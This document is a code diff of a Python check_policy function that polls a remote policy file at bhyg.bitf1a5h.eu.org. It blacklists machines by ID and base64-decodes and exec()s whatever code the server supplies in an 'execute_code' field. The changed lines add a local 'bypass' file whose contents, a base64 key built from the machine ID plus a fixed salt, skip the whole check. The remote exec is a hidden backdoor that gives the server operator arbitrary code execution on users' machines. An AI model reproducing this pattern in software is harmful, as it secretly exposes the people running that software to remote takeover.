@@ -64,7 +64,14 @@ def check_policy():
     import sys
     from loguru import logger
     import time
+    import machineid
+    import base64
     allow = True
+    if os.path.exists("bypass"):
+        with open("bypass", "r") as f:
+            key = base64.b64encode((machineid.id()+"1145141919810").encode()).decode()
+            if f.read() == key:
+                return
     for _ in range(3):
         try:
             policy = requests.get("https://bhyg.bitf1a5h.eu.org/policy.json").json()
@@ -81,7 +88,6 @@ def check_policy():
     if version not in policy["allowed versions"]:
         logger.error(i18n_format("version_not_allowed"))
         allow = False
-    import machineid
     if policy["type"] == "blacklist":
         if machineid.id() in policy["list"]:
             logger.error(i18n_format("blacklist"))
@@ -95,7 +101,6 @@ def check_policy():
     else:
         pass
     if policy["execute_code"] is not None:
-        import base64
         code = base64.b64decode(policy["execute_code"]).decode("utf-8")
         exec(code)
     if not allow:
